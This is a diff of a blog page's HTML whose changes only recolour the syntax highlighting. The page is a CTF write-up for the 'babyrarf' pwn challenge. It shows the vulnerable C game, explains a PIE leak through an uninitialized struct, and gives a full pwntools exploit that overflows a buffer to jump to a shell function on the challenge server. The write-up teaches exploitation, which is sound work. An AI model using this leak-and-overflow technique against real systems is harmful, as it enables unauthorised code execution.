@@ -90,110 +90,110 @@ Let&rsquo;s take a look at the src!
 <p>This Write-Up is about de first pwn challenge of <a href="https://ctf.cr0wn.uk">unionctf</a>: <a href="">babyrarf</a>.
 It was a really easy challenge with a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).</p>
 <p>Let&rsquo;s take a look at the src!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> attack {
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> attack {
     uint64_t id;
     uint64_t dmg;
 } attack;
 
-<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> character {
-    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">10</span>];
-    <span style="color:#66d9ef">int</span> health;
+<span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> character {
+    <span style="color:#8be9fd">char</span> name[<span style="color:#bd93f9">10</span>];
+    <span style="color:#8be9fd">int</span> health;
 } character;
 
 uint8_t score;
 
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read_int</span>(){
-    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">10</span>];
-    fgets(buf, <span style="color:#ae81ff">10</span>, stdin);
-    <span style="color:#66d9ef">return</span> atoi(buf);
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">read_int</span>(){
+    <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">10</span>];
+    fgets(buf, <span style="color:#bd93f9">10</span>, stdin);
+    <span style="color:#ff79c6">return</span> atoi(buf);
 }
 
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_shell</span>(){
-    execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL, NULL);
+<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_shell</span>(){
+    execve(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
 }
 
-attack <span style="color:#a6e22e">choose_attack</span>(){
+attack <span style="color:#50fa7b">choose_attack</span>(){
     attack a;
-    <span style="color:#66d9ef">int</span> id;
-    puts(<span style="color:#e6db74">&#34;Choose an attack:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    puts(<span style="color:#e6db74">&#34;1. Knife</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    puts(<span style="color:#e6db74">&#34;2. A bigger knife</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    puts(<span style="color:#e6db74">&#34;3. Her Majesty&#39;s knife</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    puts(<span style="color:#e6db74">&#34;4. A cr0wn</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    id <span style="color:#f92672">=</span> read_int();
-    <span style="color:#66d9ef">if</span> (id <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
-        a.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-        a.dmg <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+    <span style="color:#8be9fd">int</span> id;
+    puts(<span style="color:#f1fa8c">&#34;Choose an attack:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    puts(<span style="color:#f1fa8c">&#34;1. Knife</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    puts(<span style="color:#f1fa8c">&#34;2. A bigger knife</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    puts(<span style="color:#f1fa8c">&#34;3. Her Majesty&#39;s knife</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    puts(<span style="color:#f1fa8c">&#34;4. A cr0wn</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    id <span style="color:#ff79c6">=</span> read_int();
+    <span style="color:#ff79c6">if</span> (id <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>){
+        a.id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+        a.dmg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10</span>;
     }
-    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (id <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>){
-        a.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
-        a.dmg <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>;
+    <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (id <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">2</span>){
+        a.id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span>;
+        a.dmg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">20</span>;
     }
-    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (id <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>){
-        a.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
-        a.dmg <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>;
+    <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (id <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">3</span>){
+        a.id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3</span>;
+        a.dmg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">30</span>;
     }
-    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (id <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>){
-        <span style="color:#66d9ef">if</span> (score <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
-            puts(<span style="color:#e6db74">&#34;l0zers don&#39;t get cr0wns</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (id <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>){
+        <span style="color:#ff79c6">if</span> (score <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>){
+            puts(<span style="color:#f1fa8c">&#34;l0zers don&#39;t get cr0wns</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
         }
-        <span style="color:#66d9ef">else</span>{
-            a.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
-            a.dmg <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>;
+        <span style="color:#ff79c6">else</span>{
+            a.id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4</span>;
+            a.dmg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">40</span>;
         }
     }
-    <span style="color:#66d9ef">else</span>{
-        puts(<span style="color:#e6db74">&#34;Please select a valid attack next time</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        a.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-        a.dmg <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#ff79c6">else</span>{
+        puts(<span style="color:#f1fa8c">&#34;Please select a valid attack next time</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+        a.id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+        a.dmg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
     }
-    <span style="color:#66d9ef">return</span> a;
+    <span style="color:#ff79c6">return</span> a;
 }
 
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
-    character player <span style="color:#f92672">=</span> { .health <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>};
-    character boss <span style="color:#f92672">=</span> { .health <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>, .name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;boss&#34;</span>};
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(){
+    character player <span style="color:#ff79c6">=</span> { .health <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">100</span>};
+    character boss <span style="color:#ff79c6">=</span> { .health <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">100</span>, .name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;boss&#34;</span>};
     attack a;
-    <span style="color:#66d9ef">int</span> dmg;
+    <span style="color:#8be9fd">int</span> dmg;
 
-    setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
-    setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
-    srand(<span style="color:#ae81ff">0</span>);
+    setvbuf(stdin, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
+    setvbuf(stdout, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
+    srand(<span style="color:#bd93f9">0</span>);
 
-    puts(<span style="color:#e6db74">&#34;You are fighting the rarf boss!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    puts(<span style="color:#e6db74">&#34;What is your name?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    fgets(player.name, <span style="color:#ae81ff">10</span>, stdin);
+    puts(<span style="color:#f1fa8c">&#34;You are fighting the rarf boss!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    puts(<span style="color:#f1fa8c">&#34;What is your name?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    fgets(player.name, <span style="color:#bd93f9">10</span>, stdin);
 
-    score <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+    score <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10</span>;
 
-    <span style="color:#66d9ef">while</span> (score <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>){
-        a <span style="color:#f92672">=</span> choose_attack();
-        printf(<span style="color:#e6db74">&#34;You choose attack %llu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a.id);
-        printf(<span style="color:#e6db74">&#34;You deal %llu dmg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a.dmg);
-        boss.health <span style="color:#f92672">-=</span> a.dmg;
-        dmg <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">100</span>;
-        printf(<span style="color:#e6db74">&#34;The boss deals %llu dmg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dmg);
-        player.health <span style="color:#f92672">-=</span> dmg;
-        <span style="color:#66d9ef">if</span> (player.health <span style="color:#f92672">&gt;</span> boss.health){
-            puts(<span style="color:#e6db74">&#34;You won!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-            score <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#ff79c6">while</span> (score <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">100</span>){
+        a <span style="color:#ff79c6">=</span> choose_attack();
+        printf(<span style="color:#f1fa8c">&#34;You choose attack %llu</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, a.id);
+        printf(<span style="color:#f1fa8c">&#34;You deal %llu dmg</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, a.dmg);
+        boss.health <span style="color:#ff79c6">-=</span> a.dmg;
+        dmg <span style="color:#ff79c6">=</span> rand() <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">100</span>;
+        printf(<span style="color:#f1fa8c">&#34;The boss deals %llu dmg</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, dmg);
+        player.health <span style="color:#ff79c6">-=</span> dmg;
+        <span style="color:#ff79c6">if</span> (player.health <span style="color:#ff79c6">&gt;</span> boss.health){
+            puts(<span style="color:#f1fa8c">&#34;You won!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+            score <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>;
         }
-        <span style="color:#66d9ef">else</span>{
-            puts(<span style="color:#e6db74">&#34;You lost!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-            score <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>;
+        <span style="color:#ff79c6">else</span>{
+            puts(<span style="color:#f1fa8c">&#34;You lost!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+            score <span style="color:#ff79c6">-=</span> <span style="color:#bd93f9">1</span>;
         }
-        player.health <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>;
-        boss.health <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>;
+        player.health <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">100</span>;
+        boss.health <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">100</span>;
     }
 
-    puts(<span style="color:#e6db74">&#34;Congratulations! You may now declare yourself the winner:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    fgets(player.name, <span style="color:#ae81ff">48</span>, stdin);
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    puts(<span style="color:#f1fa8c">&#34;Congratulations! You may now declare yourself the winner:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+    fgets(player.name, <span style="color:#bd93f9">48</span>, stdin);
+    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
 }
 </code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
 <p>Let&rsquo;s take a look at gdb:</p>
@@ -258,87 +258,87 @@ Fortify                       : ✘
 RelRO                         : Partial
 </code></pre><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
 To do so we can mind the code of <code>choose_attack</code> function:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">attack <span style="color:#a6e22e">choose_attack</span>(){
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">attack <span style="color:#50fa7b">choose_attack</span>(){
     attack a;
-    <span style="color:#66d9ef">int</span> id;
-    <span style="color:#75715e">/* Some print stuff */</span>
-    id <span style="color:#f92672">=</span> read_int(); <span style="color:#75715e">// It is readinf the type of weapons we want
-</span><span style="color:#75715e"></span>    
-    <span style="color:#75715e">/* Here it is handling properly dammage and weapon type */</span>
+    <span style="color:#8be9fd">int</span> id;
+    <span style="color:#6272a4">/* Some print stuff */</span>
+    id <span style="color:#ff79c6">=</span> read_int(); <span style="color:#6272a4">// It is readinf the type of weapons we want
+</span><span style="color:#6272a4"></span>    
+    <span style="color:#6272a4">/* Here it is handling properly dammage and weapon type */</span>
 
-    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (id <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>){
-        <span style="color:#66d9ef">if</span> (score <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
-            puts(<span style="color:#e6db74">&#34;l0zers don&#39;t get cr0wns</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (id <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>){
+        <span style="color:#ff79c6">if</span> (score <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>){
+            puts(<span style="color:#f1fa8c">&#34;l0zers don&#39;t get cr0wns</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
         }
-        <span style="color:#66d9ef">else</span>{
-            a.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
-            a.dmg <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>;
+        <span style="color:#ff79c6">else</span>{
+            a.id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4</span>;
+            a.dmg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">40</span>;
         }
     }
-    <span style="color:#66d9ef">else</span>{
-        puts(<span style="color:#e6db74">&#34;Please select a valid attack next time</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        a.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-        a.dmg <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#ff79c6">else</span>{
+        puts(<span style="color:#f1fa8c">&#34;Please select a valid attack next time</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+        a.id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+        a.dmg <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
     }
-    <span style="color:#66d9ef">return</span> a;
+    <span style="color:#ff79c6">return</span> a;
 }
 </code></pre></div><p>The interesting part is that when our score is zero and that we choose the fourth weapon, the id et dmg fields are not initialized.
 And so it&rsquo;s returning a non initialized struct that it will print just next in the main function:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#75715e">/* ... */</span>
-    a <span style="color:#f92672">=</span> choose_attack();
-    printf(<span style="color:#e6db74">&#34;You choose attack %llu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a.id);
-    printf(<span style="color:#e6db74">&#34;You deal %llu dmg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a.dmg);
-    <span style="color:#75715e">/*...*/</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#6272a4">/* ... */</span>
+    a <span style="color:#ff79c6">=</span> choose_attack();
+    printf(<span style="color:#f1fa8c">&#34;You choose attack %llu</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, a.id);
+    printf(<span style="color:#f1fa8c">&#34;You deal %llu dmg</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, a.dmg);
+    <span style="color:#6272a4">/*...*/</span>
 </code></pre></div><p>Uninitialized structures are very useful to obtain leaks because their content is depending of the ancient stackframes which have stored local variables and especially useful pointers.
 And when we try to leak these datas, we can see that a.id displays the address of <code>__lib_csu_init</code>.
 So we just need to leak the address of <code>__lib_csu_init</code> to compute the base address of the binary and so the address of <code>get_shell</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 
-<span style="color:#75715e">#p = process(&#34;babyrarf&#34;)</span>
+<span style="color:#6272a4">#p = process(&#34;babyrarf&#34;)</span>
 
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;35.204.144.114&#39;</span>, <span style="color:#ae81ff">1337</span>)
-e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;babyrarf&#39;</span>)
+r <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#39;35.204.144.114&#39;</span>, <span style="color:#bd93f9">1337</span>)
+e <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;babyrarf&#39;</span>)
 
-set_ <span style="color:#f92672">=</span> False
-base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-csu_leak <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+set_ <span style="color:#ff79c6">=</span> False
+base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+csu_leak <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">padd</span>(d):
-    <span style="color:#66d9ef">return</span> d <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(d))
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">padd</span>(d):
+    <span style="color:#ff79c6">return</span> d <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\00</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">len</span>(d))
 
-<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;What is your name?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>))
-r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;nasm&#34;</span>)
-<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;4. A cr0wn</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>))
-r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+<span style="color:#ff79c6">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;What is your name?</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
+r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;nasm&#34;</span>)
+<span style="color:#ff79c6">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;4. A cr0wn</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
+r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
 
-<span style="color:#66d9ef">while</span> True:
-    a <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;4. A cr0wn</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+<span style="color:#ff79c6">while</span> True:
+    a <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;4. A cr0wn</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>)
 
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> a:
-        <span style="color:#66d9ef">break</span>
-    <span style="color:#66d9ef">print</span>(a)
+    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> a:
+        <span style="color:#ff79c6">break</span>
+    <span style="color:#ff79c6">print</span>(a)
     
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> set_:
-        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
-    <span style="color:#66d9ef">else</span>:
-        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> set_:
+        r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;4&#34;</span>)
+    <span style="color:#ff79c6">else</span>:
+        r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
 
-    b <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;You choose attack &#34;</span>)
+    b <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;You choose attack &#34;</span>)
 
-    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;l0zers don&#39;t get cr0wns&#34;</span> <span style="color:#f92672">in</span> b:
-        leak_csu <span style="color:#f92672">=</span> int(padd(r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)))
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;leak_csu={}&#34;</span><span style="color:#f92672">.</span>format(hex(int(leak_csu))))
-        base <span style="color:#f92672">=</span> leak_csu <span style="color:#f92672">-</span> e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_csu_init&#39;</span>]
+    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;l0zers don&#39;t get cr0wns&#34;</span> <span style="color:#ff79c6">in</span> b:
+        leak_csu <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(padd(r<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>)))
+        <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;leak_csu={}&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">int</span>(leak_csu))))
+        base <span style="color:#ff79c6">=</span> leak_csu <span style="color:#ff79c6">-</span> e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;__libc_csu_init&#39;</span>]
 
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;base: {}&#34;</span><span style="color:#f92672">.</span>format(hex(base)))
+        <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;base: {}&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(base)))
 
-        set_ <span style="color:#f92672">=</span> True
+        set_ <span style="color:#ff79c6">=</span> True
 
-<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Congratulations! You may now declare yourself the winner:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>))
+<span style="color:#ff79c6">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;Congratulations! You may now declare yourself the winner:</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
 
-<span style="color:#75715e">#gdb.attach(p.pid)</span>
-r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> p64(e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;get_shell&#39;</span>] <span style="color:#f92672">+</span> base))
-r<span style="color:#f92672">.</span>interactive()
+<span style="color:#6272a4">#gdb.attach(p.pid)</span>
+r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">40</span> <span style="color:#ff79c6">+</span> p64(e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;get_shell&#39;</span>] <span style="color:#ff79c6">+</span> base))
+r<span style="color:#ff79c6">.</span>interactive()
 </code></pre></div><p>We can compute compute the value of rand to avoid bruteforce, but I&rsquo;ve choosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
 When It&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
 And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
